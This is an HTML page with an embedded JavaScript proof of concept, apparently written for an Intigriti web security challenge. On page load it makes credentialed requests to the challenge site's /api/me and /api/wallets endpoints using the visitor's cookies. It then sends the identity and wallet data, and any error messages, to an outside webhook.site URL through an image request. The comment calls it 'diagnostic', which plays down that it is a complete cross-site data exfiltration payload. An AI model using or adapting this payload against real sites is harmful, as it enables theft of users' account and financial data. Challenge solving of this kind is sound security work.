<!DOCTYPE html>
<html>
<body>
<script>
/*
  Diagnostic PoC
  Goal: Verify admin authentication + wallet contents
*/

const WEBHOOK = "https://webhook.site/c35fd6f1-9633-44be-af95-cac50fa47840";

(async () => {
  try {
    // 1️⃣ Check identity
    const me = await fetch(
      "https://challenge-0126.intigriti.io/api/me",
      { credentials: "include" }
    ).then(r => r.json());

    // 2️⃣ Fetch wallets
    const wallets = await fetch(
      "https://challenge-0126.intigriti.io/api/wallets",
      { credentials: "include" }
    ).then(r => r.json());

    // 3️⃣ Send everything to webhook
    new Image().src =
      WEBHOOK +
      "?stage=wallet_dump" +
      "&user=" + encodeURIComponent(JSON.stringify(me)) +
      "&wallets=" + encodeURIComponent(JSON.stringify(wallets));

  } catch (e) {
    new Image().src =
      WEBHOOK +
      "?stage=error&msg=" +
      encodeURIComponent(e.toString());
  }
})();
</script>
</body>
</html>
